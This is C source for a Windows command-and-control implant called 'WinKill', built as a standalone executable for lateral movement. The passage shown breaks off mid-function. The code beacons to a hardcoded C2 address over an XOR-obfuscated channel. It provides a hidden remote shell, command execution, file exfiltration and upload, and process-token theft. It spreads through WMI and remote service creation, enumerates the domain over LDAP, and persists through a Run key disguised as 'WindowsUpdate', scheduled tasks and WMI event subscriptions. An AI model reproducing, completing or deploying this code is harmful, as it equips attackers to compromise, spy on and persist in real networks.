/*
 * WinKill C2 Agent - Standalone EXE
 * ==================================
 * Same agent but compiled as .exe (no injection needed).
 * Critical for lateral movement: copy+run directly on target.
 *
 * Compile: gcc -O2 -s -m64 -fno-ident -DC2_IP=0x... -DC2_PORT=4444
 *          -o agent.exe agent_exe_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32
 */

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <winldap.h>
#include <winber.h>
#include <dsrole.h>
#include <dsgetdc.h>
#include <sddl.h>
#include <lm.h>
#include <stdlib.h>
#include <string.h>
#include <wincon.h>
#include <stdio.h>

/* ConPTY */
#ifndef PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE
#define PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE 0x00020016
#endif
typedef VOID* HPCON;
WINBASEAPI VOID WINAPI ClosePseudoConsole(HPCON);

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "netapi32.lib")

#ifndef C2_IP
#define C2_IP   0xA766A8C0
#endif
#ifndef C2_PORT
#define C2_PORT 4444
#endif

/* ============================================================
 * Protocol Constants
 * ============================================================ */
#define CHAN_CTRL       0x00000000
#define CHAN_SHELL_B    0x10000000
#define CHAN_SHELL(id)  (CHAN_SHELL_B | (id))

#define MSG_HEARTBEAT   0x00
#define MSG_STATUS      0x01
#define MSG_SHUTDOWN    0x02
#define MSG_SHELL_SPAWN 0x10
#define MSG_SHELL_DATA  0x11
#define MSG_SHELL_KILL  0x12
#define MSG_PROC_LIST   0x20
#define MSG_PROC_KILL   0x21
#define MSG_FILE_GET    0x30
#define MSG_FILE_PUT    0x31
#define MSG_FILE_DATA   0x32
#define MSG_FILE_CHUNK  0x34
#define MSG_EXEC        0x40
#define MSG_EXEC_OUT    0x41
#define MSG_LATERAL     0x50
#define MSG_DOMAIN      0x60
#define MSG_DOMAIN_OUT  0x61
#define MSG_PERSIST     0x70
#define MSG_PERSIST_OUT 0x71
#define MSG_TOKEN       0x80
#define MSG_TOKEN_OUT   0x81
#define MSG_SMB_LINK    0x90
#define MSG_CONFIG      0xA0
#define MSG_CONFIG_OUT  0xA1

static BYTE g_key[16] = {
    0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,
    0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB
};
static void X(BYTE *d, DWORD n) {
    for (DWORD i = 0; i < n; i++) d[i] ^= g_key[i % 16];
}

typedef struct Job {
    DWORD  id, ch;
    HANDLE hp, ht, hi, ho;
    BYTE   _pad;
    BYTE   on;
    struct Job *nx;
} Job;

static Job      *g_j      = NULL;
static DWORD     g_nid    = 1;
static SOCKET    g_sk     = INVALID_SOCKET;
static volatile LONG g_r   = 1;
static CRITICAL_SECTION g_l;
static DWORD g_sleep_ms   = 1000;
static DWORD g_jitter_pct = 20;
static WCHAR g_shell_host[64] = L"cmd.exe";

static int Tx(DWORD ch, BYTE t, const void *d, DWORD n) {
    DWORD tl = n + 5;
    BYTE *b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl + 4);
    if (!b) return -1;
    *(DWORD *)(b) = tl; *(DWORD *)(b + 4) = ch; *(BYTE *)(b + 8) = t;
    if (d && n) memcpy(b + 9, d, n);
    X(b + 4, tl);
    int r = send(g_sk, (char *)b, tl + 4, 0);
    HeapFree(GetProcessHeap(), 0, b);
    return r;
}

static int Rx(DWORD *ch, BYTE *t, BYTE **d, DWORD *n) {
    DWORD tl;
    if (recv(g_sk, (char *)&tl, 4, 0) != 4) return -1;
    if (tl > 0x800000 || tl < 5) return -1;
    BYTE *b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl);
    if (!b) return -1;
    DWORD got = 0;
    while (got < tl) {
        int r = recv(g_sk, (char *)b + got, tl - got, 0);
        if (r <= 0) { HeapFree(GetProcessHeap(), 0, b); return -1; }
        got += r;
    }
    X(b, tl);
    *ch = *(DWORD *)(b); *t = *(BYTE *)(b + 4); *n = tl - 5;
    if (*n > 0) { *d = (BYTE *)HeapAlloc(GetProcessHeap(), 0, *n + 1);
        if (*d) { memcpy(*d, b + 5, *n); (*d)[*n] = 0; } } else *d = NULL;
    HeapFree(GetProcessHeap(), 0, b);
    return 0;
}

static Job *JN(DWORD ch) {
    Job *j = (Job *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Job));
    if (!j) return NULL;
    j->id = g_nid++; j->ch = ch; j->on = 1;
    EnterCriticalSection(&g_l); j->nx = g_j; g_j = j; LeaveCriticalSection(&g_l);
    return j;
}
static Job *JF(DWORD ch) {
    Job *j = g_j;
    while (j) { if (j->ch == ch && j->on) return j; j = j->nx; }
    return NULL;
}
static void JK(Job *j) {
    if (!j || !j->on) return; j->on = 0;
    if (j->hp) { TerminateProcess(j->hp, 0); CloseHandle(j->hp); }
    if (j->ht) CloseHandle(j->ht);
    if (j->hi) CloseHandle(j->hi);
    if (j->ho) CloseHandle(j->ho);
}
static void RP(void) {
    EnterCriticalSection(&g_l);
    Job *j = g_j;
    while (j) {
        if (j->on && j->hp && WaitForSingleObject(j->hp, 0) == WAIT_OBJECT_0) JK(j);
        j = j->nx;
    }
    LeaveCriticalSection(&g_l);
}

static DWORD WINAPI SO(LPVOID p) {
    Job *j = (Job *)p;
    BYTE b[8192]; DWORD n;
    while (j->on && ReadFile(j->ho, b, sizeof(b), &n, NULL) && n > 0)
        Tx(j->ch, MSG_SHELL_DATA, b, n);
    return 0;
}

static Job *SP(DWORD ch) {
    Job *existing = JF(ch); if (existing) return existing;

    { HANDLE r1,w1,r2,w2;SECURITY_ATTRIBUTES sa={sizeof(sa),NULL,TRUE};
        if(!CreatePipe(&r1,&w1,&sa,0))return NULL;
        if(!CreatePipe(&r2,&w2,&sa,0)){CloseHandle(r1);CloseHandle(w1);return NULL;}
        WCHAR cl[512];
        if(_wcsicmp(g_shell_host,L"powershell.exe")==0)wsprintfW(cl,L"%ls -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -Command -",g_shell_host);
        else wsprintfW(cl,L"%ls",g_shell_host);
        STARTUPINFOW si;PROCESS_INFORMATION pi;ZeroMemory(&si,sizeof(si));si.cb=sizeof(si);
        si.dwFlags=0x101;si.wShowWindow=0;si.hStdInput=r1;si.hStdOutput=w2;si.hStdError=w2;
        if(!CreateProcessW(NULL,cl,NULL,NULL,TRUE,0x08000000,NULL,NULL,&si,&pi))
        {CloseHandle(r1);CloseHandle(w1);CloseHandle(r2);CloseHandle(w2);return NULL;}
        CloseHandle(r1);CloseHandle(w2);
        Job *j=JN(ch);if(!j){TerminateProcess(pi.hProcess,0);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
            CloseHandle(w1);CloseHandle(r2);return NULL;}
        j->hp=pi.hProcess;j->ht=pi.hThread;j->hi=w1;j->ho=r2;
        CreateThread(NULL,0,SO,j,0,NULL);return j;
    }
}

// Direct program execution (no cmd.exe!)
static void RunCommand(const char *cmdLine) {
    HANDLE r1, w1, r2, w2;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&r1, &w1, &sa, 0)) goto err;
    if (!CreatePipe(&r2, &w2, &sa, 0)) { CloseHandle(r1); CloseHandle(w1); goto err; }
    SetHandleInformation(w1, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(r2, HANDLE_FLAG_INHERIT, 0);
    {
        STARTUPINFOA si; PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = r1; si.hStdOutput = w2; si.hStdError = w2;
        char *cl = (char *)HeapAlloc(GetProcessHeap(), 0, strlen(cmdLine) + 1);
        if (!cl) { CloseHandle(r1);CloseHandle(w1);CloseHandle(r2);CloseHandle(w2); goto err; }
        strcpy(cl, cmdLine);
        BOOL ok = CreateProcessA(NULL, cl, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        HeapFree(GetProcessHeap(), 0, cl);
        if (!ok) {
            DWORD le = GetLastError();
            CloseHandle(r1); CloseHandle(w1); CloseHandle(r2); CloseHandle(w2);
            /* Fallback: cmd.exe /c for builtins + AV-blocked executables */
            if (le == ERROR_ACCESS_DENIED || le == ERROR_FILE_NOT_FOUND) {
                char fb[1024]; int fl = wsprintfA(fb, "cmd.exe /c %s", cmdLine);
                char *fc = (char *)HeapAlloc(GetProcessHeap(), 0, fl + 1);
                if (fc) { strcpy(fc, fb);
                    HANDLE fr1,fw1,fr2,fw2; SECURITY_ATTRIBUTES fsa={sizeof(fsa),NULL,TRUE};
                    if (CreatePipe(&fr1,&fw1,&fsa,0) && CreatePipe(&fr2,&fw2,&fsa,0)) {
                        SetHandleInformation(fw1,HANDLE_FLAG_INHERIT,0);SetHandleInformation(fr2,HANDLE_FLAG_INHERIT,0);
                        STARTUPINFOA fsi;PROCESS_INFORMATION fpi;ZeroMemory(&fsi,sizeof(fsi));fsi.cb=sizeof(fsi);
                        fsi.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;fsi.wShowWindow=SW_HIDE;
                        fsi.hStdInput=fr1;fsi.hStdOutput=fw2;fsi.hStdError=fw2;
                        if(CreateProcessA(NULL,fc,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&fsi,&fpi)) {
                            CloseHandle(fr1);CloseHandle(fw2);
                            BYTE fb2[8192];DWORD fn;HANDLE fo=fr2;DWORD fs=GetTickCount();
                            while(1){DWORD fa=0;
                                if(PeekNamedPipe(fo,NULL,0,NULL,&fa,NULL)&&fa>0){if(ReadFile(fo,fb2,sizeof(fb2),&fn,NULL)&&fn>0)Tx(CHAN_CTRL,MSG_EXEC_OUT,fb2,fn);fs=GetTickCount();}
                                else{if(WaitForSingleObject(fpi.hProcess,50)==WAIT_OBJECT_0){DWORD fa2;
                                    while(PeekNamedPipe(fo,NULL,0,NULL,&fa2,NULL)&&fa2>0){if(ReadFile(fo,fb2,sizeof(fb2)>fa2?fa2:sizeof(fb2),&fn,NULL)&&fn>0)Tx(CHAN_CTRL,MSG_EXEC_OUT,fb2,fn);}break;}
                                    if(GetTickCount()-fs>30000){TerminateProcess(fpi.hProcess,0);break;}Sleep(50);}}
                            Tx(CHAN_CTRL,MSG_EXEC_OUT,(BYTE*)"\r\n",2);
                            CloseHandle(fw1);CloseHandle(fr2);CloseHandle(fpi.hProcess);CloseHandle(fpi.hThread);
                            HeapFree(GetProcessHeap(),0,fc);return;
                        }
                        CloseHandle(fr1);CloseHandle(fw1);CloseHandle(fr2);CloseHandle(fw2);
                    }
                    HeapFree(GetProcessHeap(),0,fc);
                }
            }
            char eb[256];
            int l = wsprintfA(eb, "ERROR: CreateProcess failed (code %lu) for: %s\r\n", le, cmdLine);
            Tx(CHAN_CTRL, MSG_EXEC_OUT, eb, l); return;
        }
        CloseHandle(r1); CloseHandle(w2);
        BYTE buf[8192]; DWORD n;
        HANDLE hOut = r2;
        DWORD startTick = GetTickCount();
        while (1) {
            DWORD avail = 0;
            if (PeekNamedPipe(hOut, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                if (ReadFile(hOut, buf, sizeof(buf), &n, NULL) && n > 0)
                    Tx(CHAN_CTRL, MSG_EXEC_OUT, buf, n);
                startTick = GetTickCount();
            } else {
                if (WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0) {
                    while (PeekNamedPipe(hOut, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                        if (ReadFile(hOut, buf, min(sizeof(buf), avail), &n, NULL) && n > 0)
                            Tx(CHAN_CTRL, MSG_EXEC_OUT, buf, n);
                    }
                    break;
                }
                if (GetTickCount() - startTick > 60000) {
                    TerminateProcess(pi.hProcess, 0);
                    Tx(CHAN_CTRL, MSG_EXEC_OUT, (BYTE*)"\r\n[TIMEOUT] 60s\r\n", 17); break;
                }
                Sleep(50);
            }
        }
        Tx(CHAN_CTRL, MSG_EXEC_OUT, (BYTE*)"\r\n", 2);
        CloseHandle(w1); CloseHandle(r2);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return;
    }
err:
    Tx(CHAN_CTRL, MSG_EXEC_OUT, (BYTE*)"ERROR: Pipe failed\r\n", 20);
}

static void PS(void) {
    char b[16384] = {0}; int p = 0;
    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (sn == INVALID_HANDLE_VALUE) return;
    SYSTEM_INFO si; GetSystemInfo(&si);
    BOOL is64 = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);
    p += wsprintfA(b + p, "%-8s %-6s %-5s %s\r\n", "PID", "PPID", "Arch", "Name");
    p += wsprintfA(b + p, "----------------------------------------\r\n");
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(sn, &pe)) {
        do {
            int r = (int)sizeof(b) - p - 256; if (r < 0) break;
            const char *arch = "?";
            if (is64) { BOOL wow64 = FALSE; HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (hp) { IsWow64Process(hp, &wow64); CloseHandle(hp); } arch = wow64 ? "x86" : "x64"; }
            else arch = "x86";
            p += wsprintfA(b + p, "%-8lu %-6lu %-5s %s\r\n", pe.th32ProcessID, pe.th32ParentProcessID, arch, pe.szExeFile);
        } while (Process32Next(sn, &pe));
    }
    CloseHandle(sn); Tx(CHAN_CTRL, MSG_PROC_LIST, b, p);
}

static void PK(const char *s) {
    DWORD pi = (DWORD)atoi(s);
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pi);
    char m[256];
    if (h) { TerminateProcess(h, 0); CloseHandle(h); wsprintfA(m, "[+] Killed PID %lu\r\n", pi); }
    else { wsprintfA(m, "[-] Failed PID %lu (err=%lu)\r\n", pi, GetLastError()); }
    Tx(CHAN_CTRL, MSG_PROC_KILL, m, (DWORD)strlen(m));
}

static void FileDownload(const char *path) {
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        char e[256]; int l = wsprintfA(e, "ERROR: Cannot open %s (err=%lu)\r\n", path, GetLastError());
        Tx(CHAN_CTRL, MSG_STATUS, e, l); return;
    }
    DWORD totalSize = GetFileSize(hf, NULL);
    DWORD pathLen = (DWORD)strlen(path);
    BYTE hdr[6 + MAX_PATH];
    *(DWORD*)hdr = totalSize; *(WORD*)(hdr + 4) = (WORD)pathLen;
    memcpy(hdr + 6, path, pathLen);
    Tx(CHAN_CTRL, MSG_FILE_DATA, hdr, 6 + pathLen);
    BYTE chunk[65535 + 10]; DWORD offset = 0;
    while (offset < totalSize) {
        DWORD chunkSize = min(65535, totalSize - offset); DWORD read;
        *(DWORD*)(chunk) = offset;
        if (ReadFile(hf, chunk + 4, chunkSize, &read, NULL) && read > 0)
        { Tx(CHAN_CTRL, MSG_FILE_CHUNK, chunk, 4 + read); offset += read; } else break;
    }
    DWORD endMarker = 0xFFFFFFFF; Tx(CHAN_CTRL, MSG_FILE_CHUNK, &endMarker, 4);
    CloseHandle(hf);
}

static void FileUpload(BYTE *d, DWORD n) {
    static HANDLE hf = INVALID_HANDLE_VALUE; static char path[MAX_PATH]; static DWORD got = 0;
    if (n >= 4 && *(DWORD*)d == 0xFFFFFFFF) {
        if (hf != INVALID_HANDLE_VALUE) { CloseHandle(hf); hf = INVALID_HANDLE_VALUE; }
        char ok[256]; int l = wsprintfA(ok, "[+] Upload complete: %s (%lu bytes)\r\n", path, got);
        Tx(CHAN_CTRL, MSG_STATUS, ok, l); got = 0; path[0] = 0; return;
    }
    if (hf == INVALID_HANDLE_VALUE) {
        if (n < 6) return;
        WORD plen = *(WORD*)(d + 4);
        if (plen >= MAX_PATH || 6 + plen > n) return;
        memcpy(path, d + 6, plen); path[plen] = 0; got = 0;
        hf = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            char e[256]; int l = wsprintfA(e, "ERROR: Cannot create %s\r\n", path);
            Tx(CHAN_CTRL, MSG_STATUS, e, l); return;
        }
    } else {
        if (n <= 4) return;
        DWORD w; WriteFile(hf, d + 4, n - 4, &w, NULL); got += w;
    }
}

static void LateralWMI(const char *target, const char *command, const char *user, const char *pass) {
    char cmd[2048];
    if (user && pass && *user)
        wsprintfA(cmd, "cmd.exe /c wmic /node:\"%s\" /user:\"%s\" /password:\"%s\" process call create \"%s\" 2>&1", target, user, pass, command);
    else
        wsprintfA(cmd, "cmd.exe /c wmic /node:\"%s\" process call create \"%s\" 2>&1", target, command);
    RunCommand(cmd);
}

static void LateralPSExec(const char *target, const char *binary, const char *svcName) {
    char cmd[4096];
    const char *svc = svcName ? svcName : "WinKillSvc";
    wsprintfA(cmd, "cmd.exe /c copy /Y \"%s\" \"\\\\%s\\admin$\\temp\\%s.exe\" 2>&1 && sc \\\\%s create %s binPath= \"C:\\Windows\\temp\\%s.exe\" start= auto 2>&1 && sc \\\\%s start %s 2>&1 && sc \\\\%s delete %s 2>&1", binary, target, svc, target, svc, svc, target, svc, target, svc);
    RunCommand(cmd);
}

static void TokenSteal(const char *targetUser, DWORD targetPID) {
    char out[4096] = {0}; int pos = 0;
    if (targetPID) {
        HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
        if (!hp) { pos += wsprintfA(out + pos, "[-] Cannot open PID %lu\r\n", targetPID);
            Tx(CHAN_CTRL, MSG_TOKEN_OUT, out, pos); return; }
        HANDLE hToken;
        if (OpenProcessToken(hp, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            HANDLE hDup;
            if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDup)) {
                STARTUPINFOW si; PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
                si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
                if (CreateProcessWithTokenW(hDup, 0, NULL, (LPWSTR)L"cmd.exe", CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                    pos += wsprintfA(out + pos, "[+] Spawned cmd.exe with stolen token (PID=%lu)\r\n", pi.dwProcessId);
                    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                }
                CloseHandle(hDup);
            }
            CloseHandle(hToken);
        }
        CloseHandle(hp);
    } else if (targetUser) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return;
        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (!hp) continue;
                HANDLE hToken;
                if (OpenProcessToken(hp, TOKEN_QUERY, &hToken)) {
                    char userName[256]={0}; DWORD nl=256; char domain[256]={0}; DWORD dl=256; SID_NAME_USE snu;
                    BYTE tuBuf[256]; DWORD tuLen;
                    if (GetTokenInformation(hToken, TokenUser, tuBuf, sizeof(tuBuf), &tuLen)) {
                        TOKEN_USER *tu = (TOKEN_USER*)tuBuf;
                        if (LookupAccountSidA(NULL, tu->User.Sid, userName, &nl, domain, &dl, &snu)) {
                            char full[512]; wsprintfA(full, "%s\\%s", domain, userName);
                            if (_stricmp(full, targetUser)==0 || _stricmp(userName, targetUser)==0) {
                                pos += wsprintfA(out+pos, "  PID %-8lu %s\\%s (%s)\r\n", pe.th32ProcessID, domain, userName, pe.szExeFile);
                                HANDLE hDup;
                                if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDup)) {
                                    STARTUPINFOW si2; PROCESS_INFORMATION pi2;
                                    ZeroMemory(&si2,sizeof(si2)); si2.cb=sizeof(si2);
                                    si2.dwFlags=STARTF_USESHOWWINDOW; si2.wShowWindow=SW_HIDE;
                                    if (CreateProcessWithTokenW(hDup,0,NULL,(LPWSTR)L"cmd.exe",CREATE_NO_WINDOW,NULL,NULL,&si2,&pi2)) {
                                        pos+=wsprintfA(out+pos,"  -> Spawned as %s\\%s (PID=%lu)\r\n",domain,userName,pi2.dwProcessId);
                                        CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread);
                                    }
                                    CloseHandle(hDup);
                                }
                            }
                        }
                    }
                    CloseHandle(hToken);
                }
                CloseHandle(hp);
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    } else { pos += wsprintfA(out+pos, "Usage: steal <PID> or steal <DOMAIN\\User>\r\n"); }
    if (pos == 0) pos += wsprintfA(out+pos, "[-] No matching processes\r\n");
    Tx(CHAN_CTRL, MSG_TOKEN_OUT, out, pos);
}

static HANDLE g_smb_pipe = INVALID_HANDLE_VALUE;
static volatile LONG g_smb_running = 0;
static DWORD WINAPI SMBRelayThread(LPVOID p) {
    char *pn = (char*)p; g_smb_running = 1;
    while (g_smb_running) {
        g_smb_pipe = CreateNamedPipeA(pn, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE|PIPE_READMODE_BYTE|PIPE_WAIT, 1, 8192, 8192, 60000, NULL);
        if (g_smb_pipe == INVALID_HANDLE_VALUE) break;
        if (ConnectNamedPipe(g_smb_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
            char msg[256]; int l = wsprintfA(msg, "[+] SMB link on %s\r\n", pn);
            Tx(CHAN_CTRL, MSG_STATUS, msg, l);
            BYTE buf[8192]; DWORD n;
            while (g_smb_running) {
                if (ReadFile(g_smb_pipe, buf, sizeof(buf), &n, NULL) && n > 0)
                    Tx(CHAN_CTRL, MSG_SMB_LINK, buf, n);
                else break;
            }
            DisconnectNamedPipe(g_smb_pipe);
        }
        CloseHandle(g_smb_pipe); g_smb_pipe = INVALID_HANDLE_VALUE;
    }
    g_smb_running = 0; return 0;
}

static void DomainDiscover(void) {
    char out[4096]={0}; int pos=0;
    DSROLE_PRIMARY_DOMAIN_INFO_BASIC *info;
    DWORD err = DsRoleGetPrimaryDomainInformation(NULL, DsRolePrimaryDomainInfoBasic, (BYTE**)&info);
    if (err==NO_ERROR && info->DomainNameDns) pos+=wsprintfA(out+pos,"[Domain] %S\r\n",info->DomainNameDns);
    else if (err==NO_ERROR && info->DomainNameFlat) pos+=wsprintfA(out+pos,"[Domain] %S\r\n",info->DomainNameFlat);
    if (info) DsRoleFreeMemory(info);
    WCHAR envD[256]; DWORD envDL=256;
    if (GetEnvironmentVariableW(L"USERDOMAIN",envD,envDL)) pos+=wsprintfA(out+pos,"[UserDomain] %S\r\n",envD);
    PDOMAIN_CONTROLLER_INFOA dcInfo=NULL;
    DWORD ret=DsGetDcNameA(NULL,NULL,NULL,NULL,DS_DIRECTORY_SERVICE_REQUIRED|DS_RETURN_DNS_NAME,&dcInfo);
    if (ret==NO_ERROR && dcInfo) { pos+=wsprintfA(out+pos,"[DC] %s (site:%s)\r\n",dcInfo->DomainControllerName,dcInfo->DcSiteName); NetApiBufferFree(dcInfo); }
    WCHAR ls[256]; DWORD lsl=256;
    if (GetEnvironmentVariableW(L"LOGONSERVER",ls,lsl)) pos+=wsprintfA(out+pos,"[LogonServer] %S\r\n",ls);
    WCHAR un[256]; DWORD unl=256;
    if (GetUserNameW(un,&unl)) pos+=wsprintfA(out+pos,"[User] %S\r\n",un);
    WCHAR cn[256]; DWORD cnl=256;
    if (GetComputerNameW(cn,&cnl)) pos+=wsprintfA(out+pos,"[Computer] %S\r\n",cn);
    Tx(CHAN_CTRL, MSG_DOMAIN_OUT, out, pos);
}

static void LDAPQuery(const char *base, const char *filter) {
    char out[65536]={0}; int pos=0;
    LDAP *ld=ldap_initA(NULL,LDAP_PORT);
    if(!ld){pos+=wsprintfA(out+pos,"[-] ldap_init failed\r\n");Tx(CHAN_CTRL,MSG_DOMAIN_OUT,out,pos);return;}
    ULONG v=LDAP_VERSION3; ldap_set_option(ld,LDAP_OPT_PROTOCOL_VERSION,&v);
    if(ldap_bind_sA(ld,NULL,NULL,LDAP_AUTH_NEGOTIATE)!=LDAP_SUCCESS){pos+=wsprintfA(out+pos,"[-] LDAP bind failed\r\n");ldap_unbind(ld);Tx(CHAN_CTRL,MSG_DOMAIN_OUT,out,pos);return;}
    char *attrs[]={"cn","sAMAccountName","description","memberOf","adminCount","operatingSystem",NULL};
    LDAPMessage *msg;
    if(ldap_search_sA(ld,(char*)base,LDAP_SCOPE_SUBTREE,(char*)filter,attrs,0,&msg)!=LDAP_SUCCESS)
    {pos+=wsprintfA(out+pos,"[-] LDAP search failed\r\n");ldap_unbind(ld);Tx(CHAN_CTRL,MSG_DOMAIN_OUT,out,pos);return;}
    int cnt=ldap_count_entries(ld,msg);
    pos+=wsprintfA(out+pos,"[+] %d entries\n%-30s %-30s %s\n","Name","sAMAccountName","DN");
    pos+=wsprintfA(out+pos,"---------------------------------------------------------------\r\n");
    LDAPMessage *e=ldap_first_entry(ld,msg);
    while(e && pos+512<(int)sizeof(out)){
        char *dn=ldap_get_dnA(ld,e),*cnn=NULL,*sam=NULL; BerElement *ber=NULL;
        char *a=ldap_first_attributeA(ld,e,&ber);
        while(a){BerValue **vals=ldap_get_values_lenA(ld,e,a);
            if(vals&&vals[0]){if(_stricmp(a,"cn")==0)cnn=_strdup(vals[0]->bv_val);if(_stricmp(a,"sAMAccountName")==0)sam=_strdup(vals[0]->bv_val);}
            if(vals)ldap_value_free_len(vals);ldap_memfreeA(a);a=ldap_next_attributeA(ld,e,ber);}
        if(ber)ber_free(ber,0);
        pos+=wsprintfA(out+pos,"%-30s %-30s %s\r\n",cnn?cnn:"(none)",sam?sam:"(none)",dn?dn:"");
        if(cnn)free(cnn);if(sam)free(sam);if(dn)ldap_memfreeA(dn);e=ldap_next_entry(ld,e);
    }
    ldap_msgfree(msg);ldap_unbind(ld);Tx(CHAN_CTRL,MSG_DOMAIN_OUT,out,pos);
}

static void PersistRegistry(const char *path) {
    char out[512]; int pos=0; HKEY hk; char fp[MAX_PATH];
    GetFullPathNameA(path,MAX_PATH,fp,NULL);
    if(RegOpenKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hk)==ERROR_SUCCESS)
    {RegSetValueExA(hk,"WindowsUpdate",0,REG_SZ,(BYTE*)fp,(DWORD)strlen(fp)+1);RegCloseKey(hk);
        pos+=wsprintfA(out+pos,"[+] Registry Run: %s\r\n",fp);}
    else pos+=wsprintfA(out+pos,"[-] Registry access denied\r\n");
    Tx(CHAN_CTRL,MSG_PERSIST_OUT,out,pos);
}

static void PersistScheduledTask(const char *path, const char *name) {
    char out[256]; int pos=0; char cmd[2048];
    wsprintfA(cmd,"cmd.exe /c schtasks /create /tn \"%s\" /tr \"%s\" /sc hourly /mo 1 /f 2>&1",name?name:"WinKillTask",path);
    RunCommand(cmd); pos+=wsprintfA(out+pos,"[+] Scheduled task: %s\r\n",name?name:"WinKillTask");
    Tx(CHAN_CTRL,MSG_PERSIST_OUT,out,pos);
}

static void PersistWMI(const char *path) {
    char out[256]; int pos=0; char cmd[2048];
    wsprintfA(cmd,"cmd.exe /c wmic /namespace:\"\\\\root\\subscription\" PATH __EventFilter WHERE Name=\"WinKillFilter\" DELETE 2>&1");RunCommand(cmd);
    wsprintfA(cmd,"cmd.exe /c wmic /namespace:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"WinKillFilter\",EventNamespace=\"root\\cimv2\",QueryLanguage=\"WQL\",Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" 2>&1");RunCommand(cmd);
    Sleep(500);
    wsprintfA(cmd,"cmd.exe /c wmic /namespace:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"WinKillConsumer\",CommandLineTemplate=\"%s\" 2>&1",path);RunCommand(cmd);
    Sleep(500);
    wsprintfA(cmd,"cmd.exe /c wmic /namespace:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"WinKillFilter\\\"\",Consumer=\"CommandLineEventConsumer.Name=\\\"WinKillConsumer\\\"\" 2>&1");RunCommand(cmd);
    pos+=wsprintfA(out+pos,"[+] WMI persistence installed\r\n");Tx(CHAN_CTRL,MSG_PERSIST_OUT,out,pos);
}

static void RunConfig(const char *cfg) {
    char out[256]={0}; int pos=0;
    char *ctx,*copy=_strdup(cfg),*tok=strtok_s(copy," ,;",&ctx);
    while(tok){if(strncmp(tok,"sleep=",6)==0){g_sleep_ms=(DWORD)atoi(tok+6);pos+=wsprintfA(out+pos,"sleep=%lums ",g_sleep_ms);}
        else if(strncmp(tok,"jitter=",7)==0){g_jitter_pct=(DWORD)atoi(tok+7);pos+=wsprintfA(out+pos,"jitter=%lu%% ",g_jitter_pct);}
        else if(strncmp(tok,"shell=",6)==0){MultiByteToWideChar(CP_UTF8,0,tok+6,-1,g_shell_host,64);pos+=wsprintfA(out+pos,"shell=%S ",g_shell_host);}
        tok=strtok_s(NULL," ,;",&ctx);}free(copy);
    if(pos>0){Tx(CHAN_CTRL,MSG_CONFIG_OUT,out,pos);}
}

static void Dispatch(DWORD ch, BYTE t, BYTE *d, DWORD n) {
    if ((ch & 0xF0000000) == CHAN_SHELL_B && t == MSG_SHELL_DATA) {
